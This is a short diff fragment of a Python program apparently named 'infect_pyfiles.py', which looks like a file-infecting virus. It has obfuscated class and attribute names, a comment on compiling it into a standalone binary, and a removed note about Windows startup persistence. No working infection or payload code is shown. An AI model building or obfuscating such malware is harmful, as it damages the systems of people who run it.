@@ -7,13 +7,8 @@ from platform import system
 from re import search
 from base64 import b64encode, b64decode
 from subprocess import run, PIPE
-
 # pip install -U nuitka
-# python3 -m nuitka --follow-imports --standalone MTRkYmNubWx_pyfiles.py
-
-# creating job that runs on startup on Windows
-# https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/
-
+# python3 -m nuitka --follow-imports --standalone infect_pyfiles.py
 class eHhjemR5eXB:
     def __init__(self):
         self.bGpqZ2hjen: str = system()
